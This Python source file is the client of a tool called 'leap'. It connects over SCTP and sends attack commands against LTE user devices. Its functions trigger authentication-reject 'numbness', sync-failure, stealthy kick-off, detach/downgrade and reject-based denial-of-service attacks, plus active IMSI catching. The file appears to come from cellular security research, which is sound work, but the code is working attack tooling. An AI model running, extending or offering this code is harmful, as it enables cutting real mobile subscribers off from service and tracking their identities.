# -*- coding:UTF-8 -*-

"""
说明：
1.本文件为 leap 客户端的定义
2.在实际部署时，需要将下面 CDLL 中所有的 “home/artifice” 替换为 “自己的 Linux 用户名”
"""

import socket
import sctp
import pprint
from . import *
from ctypes import *
from .variable_def import *
from .message_def import *
from .leap_command_def import *
from .leap_message_def import *

# 加载动态库
CDLL("/home/free/leap/build/libLFDS.so", mode=RTLD_GLOBAL)
CDLL("/home/free/leap/build/libBSTR.so", mode=RTLD_GLOBAL)
CDLL("/lib/x86_64-linux-gnu/libpthread.so.0", mode=RTLD_GLOBAL)
CDLL("/lib/x86_64-linux-gnu/librt.so.1", mode=RTLD_GLOBAL)
CDLL("/lib/x86_64-linux-gnu/libc.so.6", mode=RTLD_GLOBAL)
CDLL("/lib64/ld-linux-x86-64.so.2", mode=RTLD_GLOBAL)
CDLL("/usr/lib/x86_64-linux-gnu/libstdc++.so.6", mode=RTLD_GLOBAL)
CDLL("/home/free/leap/build/libfreewrapper.so", mode=RTLD_GLOBAL)
CDLL("/home/free/leap/build/libHASHTABLE.so", mode=RTLD_GLOBAL)
CDLL("/home/free/leap/build/libITTI.so", mode=RTLD_GLOBAL)
CDLL("/home/free/leap/build/libCN_UTILS.so", mode=RTLD_GLOBAL)
CDLL("/usr/lib/x86_64-linux-gnu/libconfig.so.9", mode=RTLD_GLOBAL)
CDLL("/usr/lib/x86_64-linux-gnu/libnettle.so.6", mode=RTLD_GLOBAL)
CDLL("/lib/x86_64-linux-gnu/libcrypto.so.1.0.0", mode=RTLD_GLOBAL)
lib_bstr = CDLL("/home/free/leap/build/libBSTR.so")
lib_nas = CDLL("/home/free/leap/build/libnas_api.so")

buf_size = 4096


# leap 类成员函数
class leap(object):

    # 创建客户端 socket 并连接到服务端
    def __init__(self, ip, port):
        self.s = sctp.sctpsocket_tcp(socket.AF_INET)
        self.s.connect((ip, eval(port)))

    # 发送消息到服务端
    def send(self, buf):
        return self.s.sctp_send(buf)

    # 从服务端接收消息
    def recv(self, size):
        server_addr, flags, buf, notif = self.s.sctp_recv(size)
        msg_proc_p = point_str(buf, leap_message_t)
        # 解析消息各个字段
        message_id = msg_proc_p.contents.message_id
        ue_id = msg_proc_p.contents.ue_id
        pbuf = create_string_buffer(buf, len(buf))
        length = msg_proc_p.contents.length
        msg = string_at(addressof(pbuf) + 3 * sizeof(c_ubyte), len(buf) - 3 * sizeof(c_ubyte))
        # 将各个字段的值返回
        return message_id, ue_id, length, msg

    # 将客户端指令封装为 leap_command 并发送到服务端
    def send_command(self, command, command_msg):
        command.length = len(command_msg)
        buf = string_at(addressof(command), sizeof(command)) + command_msg
        return self.s.sctp_send(buf)

    # 解码服务端发来的 nas 数据
    def nas_message_decode(self, encoded_nas_msg):
        # 初始化解码库
        lib_nas.nas_message_decode.argtypes = (
            POINTER(c_ubyte), POINTER(nas_message_t), c_size_t, c_void_p, POINTER(nas_message_decode_status_t))
        lib_nas.nas_message_decode.restype = c_int
        decoded_nas_msg = nas_message_t()
        decode_status = nas_message_decode_status_t()
        p_encoded_nas_msg = point_str(encoded_nas_msg, c_ubyte)
        emm_ctx = "-1\x00"
        emm_ctx = c_void_p()
        # 解码
        lib_nas.nas_message_decode(p_encoded_nas_msg, byref(decoded_nas_msg), len(encoded_nas_msg), emm_ctx,
                                   byref(decode_status))
        p_emm_msg = pointer_convert(decoded_nas_msg, EMM_msg)
        return p_emm_msg

    # 麻木攻击
    def send_authentication_reject(self, ue_id):
        command = leap_command_t()
        command.command_id = SET_AND_SEND_AUTHENTICATION_REJECT
        command.ue_id = ue_id
        command_msg = ""
        self.send_command(command, command_msg)

    # 鉴权同步失败攻击
    def execute_auth_sync_failure_attack(self):
        command = leap_command_t()
        command.command_id = AUTH_SYNC_FAILURE_ATTACK
        command_msg = ""
        self.send_command(command, command_msg)

    # 悄然中断攻击
    def execute_stealthy_kicking_off_attack(self, ue_id):
        command = leap_command_t()
        command.command_id = STEALTHY_KICKING_OFF_ATTACK
        command.ue_id = ue_id
        command_msg = ""
        self.send_command(command, command_msg)

    # 分离/降级攻击
    def send_detach_request(self, ue_id):
        command = leap_command_t()
        command.command_id = SEND_NETWORK_INITIATED_DETACH_REQUEST
        command.ue_id = ue_id
        command_msg = ""
        self.send_command(command, command_msg)

    # 拒绝服务攻击
    def send_tau_reject(self, ue_id):
        command = leap_command_t()
        command.command_id = SET_AND_SEND_TAU_REJECT
        command_msg = ""
        self.send_command(command, command_msg)

    # IMSI抓取（主动）
    def send_identity_request(self, ue_id):
        command = leap_command_t()
        command.command_id = SET_AND_SEND_IDENTITY_REQUEST
        command_msg = ""
        self.send_command(command, command_msg)

    # 拒绝服务攻击
    def send_attach_reject(self, ue_id):
        command = leap_command_t()
        command.command_id = SET_AND_SEND_ATTACH_REJECT
        command_msg = ""
        self.send_command(command, command_msg)

    # 退出服务端的循环接收
    def exit_loop(self):
        command = leap_command_t()
        command.command_id = EXIT_LOOP
        command_msg = ""
        self.send_command(command, command_msg)


# 全局功能函数
def str_to_hex(s):
    return r"/x" + r'/x'.join([hex(ord(c)).replace('0x', '') for c in s])


def pointer_convert(original_variable, new_type):
    # point to a struct with different pointer to interpret differently
    original_pointer = pointer(original_variable)
    return cast(original_pointer, POINTER(new_type))


def point_with(variable, pointer_type):
    # point a struct with pointer of specific type, for suiting input argument type
    p = POINTER(pointer_type)
    return p(variable)


def point_str(str_buf, pointer_type):
    str_buf = create_string_buffer(str_buf, len(str_buf))
    return point_with(str_buf, pointer_type)


def ppstruct(stucture_to_print):
    pprint.pprint(eval(str(stucture_to_print.contents)))
